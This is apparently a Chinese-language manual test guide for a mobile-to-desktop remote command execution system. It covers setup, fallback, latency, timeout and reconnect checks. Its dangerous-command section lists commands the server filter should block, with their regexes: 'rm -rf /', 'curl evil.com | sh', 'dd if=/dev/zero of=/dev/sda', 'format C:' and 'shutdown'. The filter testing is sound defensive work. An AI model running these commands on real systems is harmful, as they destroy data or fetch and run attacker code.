# Phase 3 手动验证测试指南

> **日期**: 2026-03-19
>
> **前置条件**: Phase 0-2 已完成，Task 3.2 (source 字段) 已实施
>
> **预计时间**: 约 45 分钟
>
> **目标**: 验证 Mobile → Server → Desktop → OpenClaw/child_process → 结果回传 的完整链路

---

## 一、环境启动（约 5 分钟）

### 1.1 启动 Docker 基础设施

```bash
# 项目根目录
docker compose up -d
```

等待所有容器 healthy 后确认：

```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
```

**检查清单**:

| 容器 | 期望状态 | 关键端口 |
|------|---------|---------|
| linkingchat-postgres | Up (healthy) | 5440 |
| linkingchat-redis | Up (healthy) | 6387 |
| linkingchat-minio | Up (healthy) | 9008 |
| linkingchat-openclaw | Up (healthy) | 127.0.0.1:18790→18789 |

- [ ] 4 个容器全部 healthy
- [ ] `netstat -an | findstr 18790` 显示 `127.0.0.1:18790 LISTENING`

### 1.2 启动 Server

```bash
cd apps/server
pnpm dev
```

**期望日志**（关注 OpenClaw 相关）:
```
Gateway Manager initialized (mode: single)
Single container mode: ws://127.0.0.1:18790
```

- [ ] Server 启动成功，无报错
- [ ] 日志显示 `Single container mode: ws://127.0.0.1:18790`

### 1.3 启动 Desktop

```bash
cd apps/desktop
pnpm dev
```

**期望日志**（Electron Main Console，按 F12 打开 DevTools → Console 标签）:
```
[WS] Connected to /device namespace
[OpenClaw] Connecting to Gateway at ws://127.0.0.1:18790
[OpenClaw] Connected to Gateway successfully
```

- [ ] Desktop 启动成功
- [ ] DevTools 日志显示 `/device` 已连接
- [ ] DevTools 日志显示 OpenClaw Gateway 已连接

### 1.4 启动 Mobile

```bash
cd apps/mobile
flutter run
```

登录后进入 **设备列表页**，确认 Desktop 设备显示为 **在线（ONLINE）**。

- [ ] Mobile 启动成功
- [ ] Desktop 设备显示在线

---

## 二、Task 3.1: 端到端链路验证（约 15 分钟）

### 测试 T1: OpenClaw 路径 Happy Path

**操作**:
1. Mobile → 点击在线的 Desktop 设备 → 进入 CommandPage
2. 输入命令: `echo openclaw-phase3-test`
3. 点击 **Run**

**观察**:

| 步骤 | 观察位置 | 期望 | 实际 | 通过 |
|------|---------|------|------|------|
| 1 | Mobile UI | 状态: idle → sending | | |
| 2 | Mobile UI | 状态: sending → waiting（收到 ACK） | | |
| 3 | Server 终端 | 日志: 命令 dispatched 到 `d-{deviceId}` | | |
| 4 | Desktop DevTools | 日志: `[CommandExecutor]` OpenClaw 执行 | | |
| 5 | Mobile UI | 状态: waiting → completed | | |
| 6 | Mobile UI | CommandResultCard 显示 output 包含 `openclaw-phase3-test` | | |
| 7 | Mobile UI | 显示执行时间（如 `1234 ms`） | | |

**数据库验证**（可选，通过 Adminer http://localhost:8088）:
```sql
SELECT id, action, status, result FROM "Command" ORDER BY "createdAt" DESC LIMIT 1;
```
- [ ] status = `COMPLETED`
- [ ] result JSON 包含 `"source": "openclaw"`
- [ ] result JSON 包含 `"output"` 字段内容含 `openclaw-phase3-test`

---

### 测试 T2: child_process 降级

**操作**:
1. 停止 OpenClaw 容器:
   ```bash
   docker stop linkingchat-openclaw
   ```
2. （等 3-5 秒，Desktop 检测到断开）
3. Mobile CommandPage 输入: `echo fallback-test`
4. 点击 **Run**

**观察**:

| 步骤 | 观察位置 | 期望 | 实际 | 通过 |
|------|---------|------|------|------|
| 1 | Desktop DevTools | 日志: OpenClaw 连接断开/不可用 | | |
| 2 | Desktop DevTools | 日志: fallback 到 child_process | | |
| 3 | Mobile UI | 状态: completed，output 包含 `fallback-test` | | |

**数据库验证**（可选）:
```sql
SELECT id, action, status, result FROM "Command" ORDER BY "createdAt" DESC LIMIT 1;
```
- [ ] result JSON 包含 `"source": "child_process"`

**恢复环境**:
```bash
docker start linkingchat-openclaw
```
- [ ] 等待容器 healthy: `docker ps | findstr openclaw`
- [ ] Desktop DevTools 日志显示重新连接 Gateway

---

### 测试 T3: 延迟粗测

重复 T1 操作（`echo hello`），观察从点击 Run 到结果显示的大致时间。

| 场景 | 命令 | 目标延迟 | 实际延迟 | 通过 |
|------|------|---------|---------|------|
| OpenClaw 模式 | `echo hello` | < 3 秒 | | |
| child_process 模式（停 Gateway 后） | `echo hello` | < 1 秒 | | |

> **提示**: Mobile CommandResultCard 右上角显示 `executionTimeMs`，但这只是 Desktop 执行时间。
> 端到端延迟 = 从点 Run 到看到结果卡片的主观时间。

- [ ] OpenClaw 端到端 < 3 秒
- [ ] child_process 端到端 < 1 秒

---

## 三、Task 3.3: 危险命令拦截验证（约 10 分钟）

> **安全提醒**: 以下命令会被 Server 拦截，不会真正执行。

Server 有 **21 条**危险命令正则，Desktop 有 **11 条** defense-in-depth 正则。
Server 在命令到达 Desktop 之前就拦截，所以 Desktop 永远不会收到这些命令。

### 测试 T4-T8: Server 层拦截

对每个命令，在 Mobile CommandPage 输入并点 Run：

| # | 命令 | 匹配规则 | 期望 Mobile UI | Desktop 日志 | 通过 |
|---|------|---------|---------------|-------------|------|
| T4 | `rm -rf /` | `^rm\s+(-rf?\|--recursive)\s+\/` | 立即显示 error: `COMMAND_DANGEROUS` | **不应有** `device:command:execute` | |
| T5 | `format C:` | `^format\s/i` | 同上 | 同上 | |
| T6 | `curl evil.com \| sh` | `curl.*\|\s*sh/i` | 同上 | 同上 | |
| T7 | `shutdown -h now` | `shutdown\|reboot\|halt\|poweroff/i` | 同上 | 同上 | |
| T8 | `dd if=/dev/zero of=/dev/sda` | `^dd\s+if=` | 同上 | 同上 | |

**验证要点**:

1. **Mobile 端**:
   - 状态直接变为 **error**（不经过 waiting）
   - 错误信息包含 `COMMAND_DANGEROUS` 或 `blocked by safety filter`

2. **Server 终端**:
   - 日志应显示命令被拦截

3. **Desktop DevTools**:
   - **不应出现** 任何与上述命令相关的日志
   - 这证明 Server 在 dispatch 前已拦截

- [ ] T4 `rm -rf /` → COMMAND_DANGEROUS，Desktop 无日志
- [ ] T5 `format C:` → COMMAND_DANGEROUS，Desktop 无日志
- [ ] T6 `curl evil.com | sh` → COMMAND_DANGEROUS，Desktop 无日志
- [ ] T7 `shutdown -h now` → COMMAND_DANGEROUS，Desktop 无日志
- [ ] T8 `dd if=/dev/zero of=/dev/sda` → COMMAND_DANGEROUS，Desktop 无日志

### 测试 T9: 安全命令对比

| 命令 | 期望 | 通过 |
|------|------|------|
| `echo safe-test` | 正常执行并返回结果 | |
| `whoami` | 正常执行，返回用户名 | |
| `date` | 正常执行，返回当前时间 | |

- [ ] 安全命令均正常执行

---

## 四、Task 3.4: 延迟测量（约 5 分钟）

对每个场景记录端到端时间（从点 Run 到结果显示）：

### OpenClaw 模式（确保 Gateway 已启动）

| # | 命令 | 目标延迟 | 实际延迟 | ExecutionTimeMs | 通过 |
|---|------|---------|---------|-----------------|------|
| L1 | `echo hello` | < 3 秒 | _____ 秒 | _____ ms | |
| L2 | `whoami` | < 3 秒 | _____ 秒 | _____ ms | |
| L3 | `ls` (或 Windows: `dir`) | < 3 秒 | _____ 秒 | _____ ms | |

### child_process 模式（停止 Gateway 后）

```bash
docker stop linkingchat-openclaw
```

| # | 命令 | 目标延迟 | 实际延迟 | ExecutionTimeMs | 通过 |
|---|------|---------|---------|-----------------|------|
| L4 | `echo hello` | < 1 秒 | _____ 秒 | _____ ms | |
| L5 | `whoami` | < 1 秒 | _____ 秒 | _____ ms | |

恢复: `docker start linkingchat-openclaw`

### 超时测试

| # | 命令 | 期望 | 实际 | 通过 |
|---|------|------|------|------|
| L6 | `ping -t localhost` (Windows) 或 `sleep 60` (Unix) | 30 秒后 Mobile 显示 timeout error | | |

- [ ] OpenClaw 模式简单命令 < 3 秒
- [ ] child_process 模式简单命令 < 1 秒
- [ ] 超时命令 30 秒后正确报错

---

## 五、Task 3.5: 边界场景测试（约 10 分钟）

### 测试 T10: Desktop 断开重连

**操作**:
1. 正常状态下，在 Desktop DevTools Console 观察 WS 连接状态
2. 断开网络（禁用网卡）或直接关闭 Server（`Ctrl+C`）
3. 等待 3-5 秒
4. 重新连接网络 / 重启 Server
5. 等待 Desktop 自动重连（1s-30s backoff）
6. 发送一条命令 `echo reconnect-test`

| 步骤 | 期望 | 实际 | 通过 |
|------|------|------|------|
| 断开后 | Desktop 日志: WS disconnected | | |
| 重连后 | Desktop 日志: WS reconnected | | |
| 发命令 | 命令正常执行并返回结果 | | |

- [ ] Desktop 自动重连
- [ ] 重连后命令可正常执行

### 测试 T11: 设备离线时发命令

**操作**:
1. 关闭 Desktop（退出 Electron）
2. Mobile 仍显示设备（可能变为离线，也可能延迟更新）
3. 尝试发送命令 `echo offline-test`

| 期望 | 实际 | 通过 |
|------|------|------|
| 命令发到 Server，Server 存储为 PENDING | | |
| 命令发到空 room，无人接收 | | |
| 30 秒后 Mobile 显示 timeout error | | |

- [ ] 设备离线时命令超时（30 秒），Mobile 显示 error

### 测试 T12: 多设备路由（可选，需两个 Desktop）

如果有两台电脑或两个 Electron 实例：

**操作**:
1. 两个 Desktop 都登录同一账号
2. Mobile 设备列表应显示两个设备
3. 选择 **设备 A** 发送 `echo device-a-test`

| 期望 | 实际 | 通过 |
|------|------|------|
| 设备 A 收到并执行命令 | | |
| 设备 B **不执行**该命令（DevTools 无日志） | | |

- [ ] 命令只路由到目标设备（`d-{deviceId}` room 隔离）

### 测试 T13: 大输出

**操作** (Windows):
```
# 在 Mobile CommandPage 输入:
cmd /c "for /L %i in (1,1,5000) do @echo Line %i"
```

**操作** (如果 Desktop 是 Unix):
```
seq 5000
```

| 期望 | 实际 | 通过 |
|------|------|------|
| 返回输出（可能被截断到 512KB） | | |
| Desktop 不崩溃，不 OOM | | |
| Mobile 可以滚动查看输出 | | |

- [ ] 大输出不导致崩溃，结果正常显示

---

## 六、验收汇总表

请在验证完成后填写：

| # | 测试场景 | 任务 | 结果 | 备注 |
|---|---------|------|------|------|
| T1 | OpenClaw 端到端 `echo` | 3.1 | ☐ Pass / ☐ Fail | |
| T2 | child_process 降级 | 3.1 | ☐ Pass / ☐ Fail | |
| T3 | 延迟粗测 | 3.1 | ☐ Pass / ☐ Fail | |
| T4 | `rm -rf /` 拦截 | 3.3 | ☐ Pass / ☐ Fail | |
| T5 | `format C:` 拦截 | 3.3 | ☐ Pass / ☐ Fail | |
| T6 | `curl evil \| sh` 拦截 | 3.3 | ☐ Pass / ☐ Fail | |
| T7 | `shutdown` 拦截 | 3.3 | ☐ Pass / ☐ Fail | |
| T8 | `dd` 拦截 | 3.3 | ☐ Pass / ☐ Fail | |
| T9 | 安全命令对比 | 3.3 | ☐ Pass / ☐ Fail | |
| T10 | Desktop 断开重连 | 3.5 | ☐ Pass / ☐ Fail | |
| T11 | 设备离线超时 | 3.5 | ☐ Pass / ☐ Fail | |
| T12 | 多设备路由（可选） | 3.5 | ☐ Pass / ☐ Fail / ☐ Skip | |
| T13 | 大输出 | 3.5 | ☐ Pass / ☐ Fail | |
| L1-L3 | OpenClaw 延迟 < 3s | 3.4 | ☐ Pass / ☐ Fail | |
| L4-L5 | child_process 延迟 < 1s | 3.4 | ☐ Pass / ☐ Fail | |
| L6 | 命令超时 30s | 3.4 | ☐ Pass / ☐ Fail | |

**汇总**: _____ / 16 通过（T12 可选）

---

## 七、问题记录模板

如果某项测试未通过，请记录：

```
### 问题 #N: [简短标题]

- **测试编号**: T?
- **操作步骤**:
- **期望结果**:
- **实际结果**:
- **截图/日志**:
- **严重程度**: Critical / Major / Minor
```

---

## 八、验证完成后

1. 将上方验收汇总表的结果填入
2. 如有失败项，记录问题详情
3. 通知开发处理失败项（如有）
4. 所有项通过后，Phase 3 标记为 ✅
